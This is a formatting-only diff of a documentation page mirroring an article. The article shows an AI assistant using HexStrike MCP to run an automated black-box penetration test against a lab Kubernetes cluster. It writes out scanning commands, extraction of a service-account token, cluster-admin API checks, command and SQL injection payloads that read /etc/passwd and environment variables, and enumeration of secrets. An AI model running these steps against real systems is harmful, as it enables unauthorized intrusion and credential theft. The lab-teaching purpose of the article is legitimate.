@@ -27,7 +27,7 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 ### The Power of One Prompt
 
-This article demonstrates how**a single prompt**to an AI assistant (Cursor) with HexStrike MCP integration can automatically perform a**complete black-box penetration test**on a Kubernetes cluster. The AI:
+This article demonstrates how **a single prompt** to an AI assistant (Cursor) with HexStrike MCP integration can automatically perform a **complete black-box penetration test** on a Kubernetes cluster. The AI:
 
 - Discovers all vulnerabilities from zero knowledge
 
@@ -41,7 +41,7 @@ This article demonstrates how**a single prompt**to an AI assistant (Cursor) with
 
 - Documents everything with proof
 
-**Key Achievement**: From one prompt to full cluster compromise in**6 minutes 40 seconds**.
+**Key Achievement**: From one prompt to full cluster compromise in **6 minutes 40 seconds**.
 
 **Lab:**
 
@@ -78,31 +78,15 @@ This article demonstrates how**a single prompt**to an AI assistant (Cursor) with
 **User Prompt to Cursor AI**:
 
 ```text
-Perform 
-a
- comprehensive black-box penetration test on the Kubernetes cluster at 
-192.168
-.
-49.2
-. 
-I
- have zero knowledge about this target. Use HexStrike MCP tools and find MULTIPLE ways 
-to
- 
-discover and exploit each vulnerability. Start 
-from
- 
-a
- single entry point and work your way 
-to
- full cluster compromise. Document 
-all
- reasoning, tool usage, and troubleshooting steps.
+Perform a comprehensive black-box penetration test on the Kubernetes cluster at 192.168.49.2. 
+I have zero knowledge about this target. Use HexStrike MCP tools and find MULTIPLE ways to 
+discover and exploit each vulnerability. Start from a single entry point and work your way 
+to full cluster compromise. Document all reasoning, tool usage, and troubleshooting steps.
 ```
 
 ## AI Initial Analysis
 
-**AI Reasoning**(internal thought process):
+**AI Reasoning** (internal thought process):
 
 &gt; “The user wants a black-box penetration test with zero prior knowledge. Key requirements:
 
@@ -146,11 +130,11 @@ The AI doesn’t just use one tool — it reasons about which tools to use and w
 
 &gt; “I need to discover all open ports. I have several options:
 
-- **nmap**— Industry standard, comprehensive
+- **nmap** — Industry standard, comprehensive
 
-- **rustscan**— Faster but less detailed
+- **rustscan** — Faster but less detailed
 
-- **masscan**— Very fast but less accurate
+- **masscan** — Very fast but less accurate
 
 &gt; For black-box testing, I need accuracy over speed. I’ll use nmap with multiple scan types:
 
@@ -170,53 +154,13 @@ The AI doesn’t just use one tool — it reasons about which tools to use and w
 # AI Decision: Use nmap with multiple scan types
 # Reasoning: Need comprehensive port discovery for black-box testing
 # Scan 1: Full TCP port scan
-nmap -sS -sV -sC -O -p- --min-rate
-=
-1000
- 
-192.168
-.
-49.2
+nmap -sS -sV -sC -O -p- --min-rate=1000 192.168.49.2
 # Scan 2: Service version detection on specific ports
-nmap -sV -p 
-30080
-,
-30081
-,
-30082
-,
-30443
-,
-8443
-,
-10250
-,
-2379
- 
-192.168
-.
-49.2
+nmap -sV -p 30080,30081,30082,30443,8443,10250,2379 192.168.49.2
 # Scan 3: Vulnerability scripts
-nmap --script vuln,exploit,auth,default -p 
-30080
-,
-30081
-,
-30082
-,
-8443
- 
-192.168
-.
-49.2
+nmap --script vuln,exploit,auth,default -p 30080,30081,30082,8443 192.168.49.2
 # Scan 4: UDP scan
-nmap -sU --top-ports
-=
-100
- 
-192.168
-.
-49.2
+nmap -sU --top-ports=100 192.168.49.2
 ```
 
 **Result**: AI discovers 4 HTTP services (ports 30080, 30081, 30082, 30443) and Kubernetes API (8443).
@@ -259,11 +203,11 @@ nmap -sU --top-ports
 
 &gt; “I found 3 HTTP services. I need to understand what each does. I’ll use multiple tools:
 
-- **httpx**— Fast HTTP probing with technology detection
+- **httpx** — Fast HTTP probing with technology detection
 
-- **curl**— Manual testing for specific endpoints
+- **curl** — Manual testing for specific endpoints
 
-- **nuclei**— Automated vulnerability scanning
+- **nuclei** — Automated vulnerability scanning
 
 &gt; Using multiple tools ensures I don’t miss anything.”
 
@@ -274,17 +218,8 @@ nmap -sU --top-ports
 ```text
 # AI Decision: Use httpx for initial service discovery
 # Reasoning: Fast, provides technology detection, title extraction
-httpx -u http:
-//
-192.168
-.
-49.2
-:
-30080
- \
-  -title -status-code -tech-detect -content-
-length
- -server \
+httpx -u http://192.168.49.2:30080 \
+  -title -status-code -tech-detect -content-length -server \
   -json -silent
 ```
 
@@ -296,13 +231,8 @@ length
 
 ```text
 # AI Decision: Run nuclei in parallel
-# Reasoning: Automated vulnerability detection 
-while
- I 
-do
- manual testing
-nuclei -u http:
-//192.168.49.2:30080 \
+# Reasoning: Automated vulnerability detection while I do manual testing
+nuclei -u http://192.168.49.2:30080 \
   -severity critical,high,medium \
   -silent -json
 ```
@@ -316,17 +246,8 @@ nuclei -u http:
 ```text
 # AI Decision: Test common API endpoints manually
 # Reasoning: Automated tools might miss custom endpoints
-for
- endpoint 
-in
- /api /api/token /api/execute /api/users /api/health; 
-do
-  curl -s -o /dev/null -w 
-"%{http_code}"
- 
-"http://192.168.49.2:30082
-$endpoint
-"
+for endpoint in /api /api/token /api/execute /api/users /api/health; do
+  curl -s -o /dev/null -w "%{http_code}" "http://192.168.49.2:30082$endpoint"
 done
 ```
 
@@ -364,17 +285,8 @@ curl -s http://192.168.49.2:30082/api/token
 
 ```text
 {
-  
-"token"
-:
- 
-"eyJhbGciOiJSUzI1NiIs..."
-,
-  
-"message"
-:
- 
-"Service account token exposed!"
+  "token": "eyJhbGciOiJSUzI1NiIs...",
+  "message": "Service account token exposed!"
 }
 ```
 
@@ -387,15 +299,8 @@ curl -s http://192.168.49.2:30082/api/token
 ```text
 # AI Decision: Test alternative paths
 # Reasoning: Token might be exposed via other endpoints
-for
- path 
-in
- /token /api/token /v1/token /api/v1/token /auth/token; 
-do
-  curl -s 
-"http://192.168.49.2:30082
-$path
-"
+for path in /token /api/token /v1/token /api/v1/token /auth/token; do
+  curl -s "http://192.168.49.2:30082$path"
 done
 ```
 
@@ -433,15 +338,9 @@ curl -s -I http://192.168.49.2:30082/api/token
 
 ```text
 # Extract token
-TOKEN=$(curl -s http://192.168.49.2:30082/api/token | jq -r 
-'.token'
-)
+TOKEN=$(curl -s http://192.168.49.2:30082/api/token | jq -r '.token')
 # Test 1: Basic API access
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- \
+curl -k -s -H "Authorization: Bearer $TOKEN" \
   https://192.168.49.2:8443/api/v1/namespaces
 ```
 
@@ -452,29 +351,9 @@ $TOKEN
 ```text
 # Test 2: Permission check
 curl -k -s -X POST \
-  -H 
-"Authorization: Bearer $TOKEN"
- \
-  -H 
-"Content-Type: application/json"
- \
-  -d '{
-"spec"
-:{
-"resourceAttributes"
-:{
-"namespace"
-:
-"*"
-,
-"verb"
-:
-"*"
-,
-"resource"
-:
-"*"
-}}}' \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"spec":{"resourceAttributes":{"namespace":"*","verb":"*","resource":"*"}}}' \
   https://192.168.49.2:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
 ```
 
@@ -482,26 +361,9 @@ curl -k -s -X POST \
 
 ```text
 {
-  
-"status"
-: {
-    
-"allowed"
-: 
-true
-,
-    
-"reason"
-: 
-"RBAC: allowed by ClusterRoleBinding 
-\"
-vulnerable-cluster-admin-binding
-\"
- of ClusterRole 
-\"
-cluster-admin
-\"
-"
+  "status": {
+    "allowed": true,
+    "reason": "RBAC: allowed by ClusterRoleBinding \"vulnerable-cluster-admin-binding\" of ClusterRole \"cluster-admin\""
   }
 }
 ```
@@ -553,41 +415,18 @@ cluster-admin
 ```text
 # AI Decision: Test multiple command injection payloads
 # Reasoning: Different commands reveal different information
-for
- payload 
-in
- 
-"id"
- 
-"whoami"
- 
-"uname -a"
- 
-"cat /etc/passwd"
- 
-"ls -la /"
- 
-"env"
-; 
-do
-  curl -s -X POST 
-"http://192.168.49.2:30081/api/execute"
- \
-    -H 
-"Content-Type: application/json"
- \
-    -d 
-"{\"command\":\"
-$payload
-\"}"
+for payload in "id" "whoami" "uname -a" "cat /etc/passwd" "ls -la /" "env"; do
+  curl -s -X POST "http://192.168.49.2:30081/api/execute" \
+    -H "Content-Type: application/json" \
+    -d "{\"command\":\"$payload\"}"
 done
 ```
 
 **Results**:
 
-- `id`:`uid=0(root) gid=0(root) groups=0(root)`
+- `id`: `uid=0(root) gid=0(root) groups=0(root)`
 
-- `whoami`:`root`
+- `whoami`: `root`
 
 - `uname -a`: System information extracted
 
@@ -624,15 +463,8 @@ done
 ```text
 # AI Decision: Use SQLMap for automated SQL injection testing
 # Reasoning: SQLMap tests multiple techniques automatically
-sqlmap -u 
-"http://192.168.49.2:30080/?username=test"
- \
-  --batch --level
-=
-3
- --risk
-=
-3
+sqlmap -u "http://192.168.49.2:30080/?username=test" \
+  --batch --level=3 --risk=3
 ```
 
 **AI Analysis**:
@@ -644,27 +476,12 @@ sqlmap -u
 ```text
 # AI Decision: Test manual payloads
 # Reasoning: Verify SQLMap findings and test different techniques
-for
- payload 
-in
- \
-  
-"admin' OR '1'='1"
- \
-  
-"admin' OR '1'='1'--"
- \
-  
-"admin' OR '1'='1'/*"
- \
-  
-"' UNION SELECT NULL--"
-; 
-do
-  curl -s 
-"http://192.168.49.2:30080/?username=
-$(echo $payload | sed 's/ /%20/g')
-"
+for payload in \
+  "admin' OR '1'='1" \
+  "admin' OR '1'='1'--" \
+  "admin' OR '1'='1'/*" \
+  "' UNION SELECT NULL--"; do
+  curl -s "http://192.168.49.2:30080/?username=$(echo $payload | sed 's/ /%20/g')"
 done
 ```
 
@@ -693,38 +510,25 @@ done
 ```text
 # AI Decision: Enumerate all major resource types
 # Reasoning: Need complete picture of cluster
-for
- resource 
-in
- pods secrets configmaps serviceaccounts roles clusterroles; 
-do
-  curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- \
-    
-"https://192.168.49.2:8443/api/v1/
-$resource
-"
- | jq 
-'.'
+for resource in pods secrets configmaps serviceaccounts roles clusterroles; do
+  curl -k -s -H "Authorization: Bearer $TOKEN" \
+    "https://192.168.49.2:8443/api/v1/$resource" | jq '.'
 done
 ```
 
 **AI Findings**:
 
-- **27 pods**discovered
+- **27 pods** discovered
 
-- **50 service accounts**discovered
+- **50 service accounts** discovered
 
-- **1 secret**discovered
+- **1 secret** discovered
 
-- **19 ConfigMaps**discovered
+- **19 ConfigMaps** discovered
 
-- **12 Roles**discovered
+- **12 Roles** discovered
 
-- **73 ClusterRoles**discovered
+- **73 ClusterRoles** discovered
 
 **AI Analysis**:
 
@@ -743,19 +547,12 @@ done
 ```text
 # AI Decision: Find privileged containers
 # Reasoning: Privileged containers can escape to host
-curl -k -s -H 
-"Authorization: Bearer 
-$TOKEN
-"
- \
-  
-"https://192.168.49.2:8443/api/v1/pods"
- | \
-  jq -r 
-'.items[] | select(.spec.containers[]?.securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'
+curl -k -s -H "Authorization: Bearer $TOKEN" \
+  "https://192.168.49.2:8443/api/v1/pods" | \
+  jq -r '.items[] | select(.spec.containers[]?.securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'
 ```
 
-**Result**:**13 privileged pods**found
+**Result**: **13 privileged pods** found
 
 **AI Analysis**:
 
@@ -769,7 +566,7 @@ The AI doesn’t stop at the first working method. It systematically tests multi
 
 ### Token Extraction — 3 Methods Tested
 
-**Method 1: Direct API Call**✅
+**Method 1: Direct API Call** ✅
 
 ```text
 curl -s http://192.168.49.2:30082/api/token
@@ -777,24 +574,17 @@ curl -s http://192.168.49.2:30082/api/token
 
 **Result**: Token extracted successfully
 
-**Method 2: Alternative Paths**❌
+**Method 2: Alternative Paths** ❌
 
 ```text
-for
- path 
-in
- /token /api/token /v1/token /api/v1/token /auth/token; 
-do
-  curl -s 
-"http://192.168.49.2:30082
-$path
-"
+for path in /token /api/token /v1/token /api/v1/token /auth/token; do
+  curl -s "http://192.168.49.2:30082$path"
 done
 ```
 
-**Result**: Only`/api/token`works
+**Result**: Only `/api/token` works
 
-**Method 3: Response Headers**❌
+**Method 3: Response Headers** ❌
 
 ```text
 curl -s -I http://192.168.49.2:30082/api/token
@@ -802,7 +592,7 @@ curl -s -I http://192.168.49.2:30082/api/token
 
 **Result**: No token in headers
 
-**AI Conclusion**: “Token is only accessible via`/api/token`endpoint. But I found it, and it works with Kubernetes API."
+**AI Conclusion**: “Token is only accessible via `/api/token` endpoint. But I found it, and it works with Kubernetes API."
 
 ### Command Injection — 6 Payloads Tested
 
@@ -820,17 +610,17 @@ curl -s -I http://192.168.49.2:30082/api/token
 
 **Payloads Tested**:
 
-- `id`- User information
+- `id` - User information
 
-- `whoami`- Current user
+- `whoami` - Current user
 
-- `uname -a`- System information
+- `uname -a` - System information
 
-- `cat /etc/passwd`- User accounts
+- `cat /etc/passwd` - User accounts
 
-- `ls -la /`- File system listing
+- `ls -la /` - File system listing
 
-- `env`- Environment variables (71 found!)
+- `env` - Environment variables (71 found!)
 
 **AI Analysis**:
 
@@ -844,7 +634,7 @@ curl -s -I http://192.168.49.2:30082/api/token
 
 ### SQL Injection — 2 Techniques Tested
 
-**Technique 1: SQLMap Automated**✅
+**Technique 1: SQLMap Automated** ✅
 
 - Detected: Boolean-based blind SQL injection
 
@@ -852,13 +642,13 @@ curl -s -I http://192.168.49.2:30082/api/token
 
 - Technique: UNION query
 
-**Technique 2: Manual Payloads**✅
+**Technique 2: Manual Payloads** ✅
 
-- Boolean-based:`admin' OR '1'='1`
+- Boolean-based: `admin' OR '1'='1`
 
-- Comment-based:`admin' OR '1'='1'--`
+- Comment-based: `admin' OR '1'='1'--`
 
-- Union-based:`' UNION SELECT NULL--`
+- Union-based: `' UNION SELECT NULL--`
 
 **AI Analysis**:
 
@@ -878,7 +668,7 @@ The AI doesn’t give up when something fails. It reasons through problems and f
 
 ### Problem 1: Tool Not Available
 
-**Scenario**: AI tries to use`feroxbuster`but it's not installed.
+**Scenario**: AI tries to use `feroxbuster` but it's not installed.
 
 **AI Reasoning**:
 
@@ -898,23 +688,9 @@ The AI doesn’t give up when something fails. It reasons through problems and f
 # AI Decision: Use alternative tools
 # Reasoning: Multiple directory enumeration tools provide redundancy
 # Use gobuster
-gobuster dir -u http:
-//
-192.168
-.
-49.2
-:
-30080
- -w wordlist.txt
+gobuster dir -u http://192.168.49.2:30080 -w wordlist.txt
 # Use ffuf
-ffuf -u http:
-//
-192.168
-.
-49.2
-:
-30080
-/FUZZ -w wordlist.txt
+ffuf -u http://192.168.49.2:30080/FUZZ -w wordlist.txt
 ```
 
 **AI Learning**: “Tool availability issues can be solved by using alternative tools. Having multiple tools is important.”
@@ -942,9 +718,7 @@ ffuf -u http:
 ```text
 # AI Decision: Try without wordlist or use default
 # Reasoning: Directory enumeration is supplementary, not critical
-gobuster 
-dir
- -u http://192.168.49.2:30080
+gobuster dir -u http://192.168.49.2:30080
 # Or skip and continue with other tests
 ```
 
@@ -963,13 +737,11 @@ dir
 ```text
 # AI Decision: Add --batch flag
 # Reasoning: Need non-interactive mode for automation
-sqlmap -u 
-"http://192.168.49.2:30080/?username=test"
- \
+sqlmap -u "http://192.168.49.2:30080/?username=test" \
   --batch --level=3 --risk=3
 ```
 
-**AI Learning**: “Always use non-interactive flags (`--batch`,`-y`, etc.) for automated tools."
+**AI Learning**: “Always use non-interactive flags (`--batch`, `-y`, etc.) for automated tools."
 
 ### Problem 4: File Naming Issues
 
@@ -984,29 +756,8 @@ sqlmap -u
 ```text
 # AI Decision: Sanitize filenames
 # Reasoning: Special characters break file operations
-payload_safe=$(
-echo
- 
-"
-$payload
-"
- | 
-tr
- 
-' '
- 
-'_'
- | 
-tr
- 
-'/'
- 
-'_'
-)
-curl ... > 
-"results/cmd-injection-
-$payload_safe
-.json"
+payload_safe=$(echo "$payload" | tr ' ' '_' | tr '/' '_')
+curl ... > "results/cmd-injection-$payload_safe.json"
 ```
 
 **AI Learning**: “Always sanitize user input, even when it’s from my own payloads.”
@@ -1018,232 +769,49 @@ $payload_safe
 **AI’s Attack Path**:
 
 ```text
-Stage 0:
- 
-Initial
- 
-Prompt
-    
-↓
-    
-AI Reasoning:
- 
-"I need to discover everything from scratch"
-    
-↓
-Stage 1:
- 
-Network
- 
-Reconnaissance
- 
-(nmap)
-    
-↓
-    
-AI Discovery:
- 
-4
- 
-HTTP
- 
-services
- 
-+
- 
-K8s
- 
-API
-    
-↓
-    
-AI Decision:
- 
-"HTTP services are easier entry points"
-    
-↓
-Stage 2:
- 
-Service
- 
-Discovery
- 
-(httpx,
- 
-nuclei,
- 
-curl)
-    
-↓
-    
-AI Discovery:
- 
-/api/token
- 
-endpoint
- 
-on
- 
-port
- 
-30082
-    
-↓
-    
-AI Decision:
- 
-"This could expose tokens - test immediately"
-    
-↓
-Stage 3:
- 
-Token
- 
-Extraction
- 
-(curl
- 
--
- 
-multiple
- 
-methods)
-    
-↓
-    
-AI Success:
- 
-Token
- 
-extracted
-    
-↓
-    
-AI Decision:
- 
-"Test if token works with K8s API"
-    
-↓
-Stage 4:
- 
-Kubernetes
- 
-API
- 
-Access
- 
-(curl
- 
-+
- 
-token)
-    
-↓
-    
-AI Success:
- 
-Cluster-admin
- 
-access
- 
-confirmed
-    
-↓
-    
-AI Decision:
- 
-"I have cluster access, but user wants MULTIPLE ways"
-    
-↓
-Stage 5:
- 
-Multiple
- 
-Exploitation
- 
-(command
- 
-injection,
- 
-SQL
- 
-injection)
-    
-↓
-    
-AI Success:
- 
-3
- 
-different
- 
-attack
- 
-vectors
- 
-confirmed
-    
-↓
-    
-AI Decision:
- 
-"Enumerate cluster to find all vulnerabilities"
-    
-↓
-Stage 6:
- 
-Cluster
- 
-Enumeration
- 
-(curl
- 
-+
- 
-jq)
-    
-↓
-    
-AI Discovery:
- 
-27
- 
-pods,
- 
-13
- 
-privileged,
- 
-50
- 
-service
- 
-accounts
-    
-↓
-    
-AI Decision:
- 
-"Extract complete cluster state"
-    
-↓
-Stage 7:
- 
-Data
- 
-Extraction
-    
-↓
-    
-AI Success:
- 
-Full
- 
-cluster
- 
-compromise
- 
-documented
+Stage 0: Initial Prompt
+    ↓
+    AI Reasoning: "I need to discover everything from scratch"
+    ↓
+Stage 1: Network Reconnaissance (nmap)
+    ↓
+    AI Discovery: 4 HTTP services + K8s API
+    ↓
+    AI Decision: "HTTP services are easier entry points"
+    ↓
+Stage 2: Service Discovery (httpx, nuclei, curl)
+    ↓
+    AI Discovery: /api/token endpoint on port 30082
+    ↓
+    AI Decision: "This could expose tokens - test immediately"
+    ↓
+Stage 3: Token Extraction (curl - multiple methods)
+    ↓
+    AI Success: Token extracted
+    ↓
+    AI Decision: "Test if token works with K8s API"
+    ↓
+Stage 4: Kubernetes API Access (curl + token)
+    ↓
+    AI Success: Cluster-admin access confirmed
+    ↓
+    AI Decision: "I have cluster access, but user wants MULTIPLE ways"
+    ↓
+Stage 5: Multiple Exploitation (command injection, SQL injection)
+    ↓
+    AI Success: 3 different attack vectors confirmed
+    ↓
+    AI Decision: "Enumerate cluster to find all vulnerabilities"
+    ↓
+Stage 6: Cluster Enumeration (curl + jq)
+    ↓
+    AI Discovery: 27 pods, 13 privileged, 50 service accounts
+    ↓
+    AI Decision: "Extract complete cluster state"
+    ↓
+Stage 7: Data Extraction
+    ↓
+    AI Success: Full cluster compromise documented
 ```
 
 ## Multiple Attack Vectors Discovered
@@ -1252,19 +820,19 @@ documented
 
 - **Primary Vector**: Token Exposure → Cluster-Admin Access
 
-- Entry: Port 30082`/api/token`
+- Entry: Port 30082 `/api/token`
 
 - Result: Full cluster control
 
 **2. Secondary Vector**: Command Injection → Container Control
 
-- Entry: Port 30081`/api/execute`
+- Entry: Port 30081 `/api/execute`
 
 - Result: Root RCE, environment variable extraction
 
 **3. Tertiary Vector**: SQL Injection → Database Access
 
-- Entry: Port 30080`?username=`
+- Entry: Port 30080 `?username=`
 
 - Result: Database compromise potential
 
@@ -1361,16 +929,8 @@ documented
 ### What the User Actually Types
 
 ```text
-Perform a comprehensive black-box penetration test 
-on
- the Kubernetes cluster at 
-192.168
-.49
-.2
-. 
-I have zero knowledge about 
-this
- target. 
+Perform a comprehensive black-box penetration test on the Kubernetes cluster at 192.168.49.2. 
+I have zero knowledge about this target. 
 ```
 
 ```text
@@ -1395,21 +955,21 @@ Show me:
 
 ## What the AI Does
 
-- **Analyzes the prompt**— Understands requirements
+- **Analyzes the prompt** — Understands requirements
 
-- **Plans the attack**— Creates strategy
+- **Plans the attack** — Creates strategy
 
-- **Selects tools**— Reasons about which tools to use
+- **Selects tools** — Reasons about which tools to use
 
-- **Executes tests**— Runs all tools systematically
+- **Executes tests** — Runs all tools systematically
 
-- **Finds vulnerabilities**— Discovers multiple issues
+- **Finds vulnerabilities** — Discovers multiple issues
 
-- **Tests multiple methods**— Doesn’t stop at first success
+- **Tests multiple methods** — Doesn’t stop at first success
 
-- **Troubleshoots**— Fixes problems automatically
+- **Troubleshoots** — Fixes problems automatically
 
-- **Documents everything**— Creates comprehensive report
+- **Documents everything** — Creates comprehensive report
 
 **Result**: Complete penetration test from one prompt.
 
@@ -1417,7 +977,7 @@ Show me:
 
 ## The Power of AI + HexStrike MCP
 
-This article demonstrates how**one prompt**to an AI assistant with HexStrike MCP can:
+This article demonstrates how **one prompt** to an AI assistant with HexStrike MCP can:
 
 - Perform complete black-box penetration test
 
@@ -1431,7 +991,7 @@ This article demonstrates how**one prompt**to an AI assistant with HexStrike MCP
 
 - Document everything
 
-**Key Takeaway**: AI-powered penetration testing with HexStrike MCP transforms a complex, multi-day manual process into a**single prompt**that completes in minutes.
+**Key Takeaway**: AI-powered penetration testing with HexStrike MCP transforms a complex, multi-day manual process into a **single prompt** that completes in minutes.
 
 **Test Results**:
 
@@ -1447,4 +1007,4 @@ This article demonstrates how**one prompt**to an AI assistant with HexStrike MCP
 
 - **Proof Files**: 50+ created
 
-**Status**:**FULL CLUSTER COMPROMISE ACHIEVED**
+**Status**: **FULL CLUSTER COMPROMISE ACHIEVED**
